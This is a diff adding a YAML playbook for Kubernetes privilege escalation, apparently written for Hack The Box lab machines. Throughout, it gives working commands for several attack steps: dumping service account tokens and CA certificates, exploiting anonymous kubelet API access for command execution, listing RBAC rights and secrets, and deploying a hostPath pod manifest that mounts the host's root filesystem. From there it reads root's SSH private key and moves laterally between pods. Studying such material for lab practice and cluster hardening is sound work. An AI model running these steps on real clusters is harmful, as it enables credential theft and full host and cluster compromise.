@@ -1,0 +1,280 @@
+name: Linux Privilege Escalation - Kubernetes
+
+steps:
+
+# =========================================================
+# [1] ENUMERATION
+# =========================================================
+- title: Kubernetes Enumeration
+  mode: enum
+  info: |
+    Identify Kubernetes environment and exposed services.
+
+  entries:
+
+    - cmd: "env | grep KUBE"
+      info: enumerate kubernetes environment variables
+
+    - cmd: "mount | grep kube"
+      info: enumerate mounted kubernetes paths
+
+    - cmd: "find / -name kubeconfig 2>/dev/null"
+      info: locate kube configs
+
+    - cmd: "find / -name '*.crt' 2>/dev/null"
+      info: locate certificates
+
+    - cmd: "find / -name token 2>/dev/null"
+      info: locate service account tokens
+
+    - cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+      info: dump service account token
+
+    - cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+      info: identify namespace
+
+    - cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+      info: dump CA certificate
+
+  look_for:
+    - service account tokens
+    - kube configs
+    - certificates
+    - namespaces
+
+  notes:
+    - most HTB K8s boxes expose service account tokens
+    - mounted tokens are extremely valuable
+
+# =========================================================
+# [2] ENUMERATE K8S SERVICES
+# =========================================================
+- title: Kubernetes Service Discovery
+  mode: enum
+  info: |
+    Identify exposed Kubernetes APIs.
+
+  entries:
+
+    - cmd: "netstat -tulnp"
+      info: enumerate listening ports
+
+    - cmd: "ss -tulnp"
+      info: enumerate listening services
+
+    - cmd: "curl https://127.0.0.1:6443 -k"
+      info: test Kubernetes API server
+
+    - cmd: "curl https://127.0.0.1:10250/pods -k"
+      info: test kubelet API
+
+    - cmd: "curl https://<target>:10250/pods -k | jq ."
+      info: enumerate pods via kubelet API
+
+  look_for:
+    - 6443
+    - 10250
+    - anonymous kubelet access
+
+  notes:
+    - kubelet API exposure is extremely common in HTB
+    - anonymous kubelet access often leads directly to RCE
+
+# =========================================================
+# [3] KUBELETCTL ENUMERATION
+# =========================================================
+- title: Kubeletctl Enumeration
+  mode: chain
+  info: |
+    Enumerate pods and identify RCE-capable containers.
+
+  entries:
+
+    - cmd: "kubeletctl -i --server <target> pods"
+      info: enumerate pods
+
+    - cmd: "kubeletctl -i --server <target> scan rce"
+      info: identify vulnerable containers
+
+    - cmd: "kubeletctl -i --server <target> exec 'id' -p nginx -c nginx"
+      info: execute command in pod
+
+    - cmd: "kubeletctl -i --server <target> exec 'hostname' -p nginx -c nginx"
+      info: verify execution
+
+  look_for:
+    - uid=0(root)
+    - accessible containers
+    - kube-system namespace
+
+  notes:
+    - kubeletctl is one of the most useful K8s tools
+    - RCE via kubelet API solves many HTB Kubernetes boxes
+
+# =========================================================
+# [4] EXTRACT TOKENS & CERTIFICATES
+# =========================================================
+- title: Extract Kubernetes Credentials
+  mode: chain
+  info: |
+    Extract service account token and CA certificate.
+
+  entries:
+
+    - cmd: "kubeletctl --server <target> exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx | tee k8.token"
+      info: dump service account token
+
+    - cmd: "kubeletctl --server <target> exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx | tee ca.crt"
+      info: dump CA certificate
+
+    - cmd: "export token=$(cat k8.token)"
+      info: export token variable
+
+  notes:
+    - service account tokens allow authenticated cluster access
+    - many clusters overprivilege service accounts
+
+# =========================================================
+# [5] ENUMERATE RBAC PERMISSIONS
+# =========================================================
+- title: Enumerate RBAC Permissions
+  mode: enum
+  info: |
+    Check what actions the service account can perform.
+
+  entries:
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 auth can-i --list"
+      info: enumerate permissions
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 get pods"
+      info: enumerate pods
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 get namespaces"
+      info: enumerate namespaces
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 get secrets -A"
+      info: enumerate secrets
+
+  look_for:
+    - create pods
+    - get secrets
+    - cluster-admin
+    - wildcard permissions
+
+  notes:
+    - "'create pods' is usually game over"
+    - secret access often exposes additional credentials
+
+# =========================================================
+# [6] POD CREATION PRIVESC
+# =========================================================
+- title: Create Privileged Pod
+  mode: chain
+  info: |
+    Mount host filesystem into malicious pod.
+
+  entries:
+
+    - cmd: "nano privesc.yaml"
+      info: create malicious pod yaml
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 apply -f privesc.yaml"
+      info: deploy malicious pod
+
+    - cmd: "kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 get pods"
+      info: verify pod started
+
+    - cmd: "kubeletctl --server <target> exec 'id' -p privesc -c privesc"
+      info: verify access
+
+    - cmd: "kubeletctl --server <target> exec 'cat /root/root/.ssh/id_rsa' -p privesc -c privesc"
+      info: dump host root ssh key
+
+  notes:
+    - hostPath mount = host filesystem access
+    - this is the most common Kubernetes privesc path
+
+# =========================================================
+# [7] MALICIOUS POD YAML
+# =========================================================
+- title: Privileged Pod YAML
+  mode: manual
+  info: |
+    Standard hostPath mount privesc pod.
+
+  entries:
+
+    - cmd: |
+        "cat <<EOF > privesc.yaml
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: privesc
+          namespace: default
+        spec:
+          hostNetwork: true
+          containers:
+          - name: privesc
+            image: nginx:1.14.2
+            command: ["/bin/sh"]
+            args: ["-c", "sleep infinity"]
+            volumeMounts:
+            - name: host-root
+              mountPath: /root
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+          automountServiceAccountToken: true
+        EOF"
+      info: create malicious pod yaml
+
+# =========================================================
+# [8] LOOTING & POST-EXPLOITATION
+# =========================================================
+- title: Loot Host & Cluster
+  mode: enum
+  info: |
+    Extract credentials and sensitive cluster data.
+
+  entries:
+
+    - cmd: "cat /root/root/.ssh/id_rsa"
+      info: dump root ssh key
+
+    - cmd: "kubectl get secrets -A"
+      info: enumerate secrets
+
+    - cmd: "kubectl describe secret <secret>"
+      info: inspect secret contents
+
+    - cmd: "kubectl get nodes"
+      info: enumerate nodes
+
+    - cmd: "kubectl get pods -A"
+      info: enumerate all pods
+
+    - cmd: "kubectl exec -it <pod> -- /bin/sh"
+      info: move laterally between pods
+
+  notes:
+    - secrets frequently contain cloud creds
+    - cluster compromise often leads to cloud compromise
+
+# =========================================================
+# [9] QUICK WIN CHECKLIST
+# =========================================================
+- title: Quick Win Checklist
+  mode: chain
+  entries:
+
+    - cmd: "Check kubelet API (10250)"
+    - cmd: "Check anonymous kubelet access"
+    - cmd: "Enumerate pods with kubeletctl"
+    - cmd: "Attempt exec into containers"
+    - cmd: "Dump service account token"
+    - cmd: "Run kubectl auth can-i --list"
+    - cmd: "Check if pod creation is allowed"
+    - cmd: "Deploy hostPath privesc pod"
+    - cmd: "Dump root SSH keys"
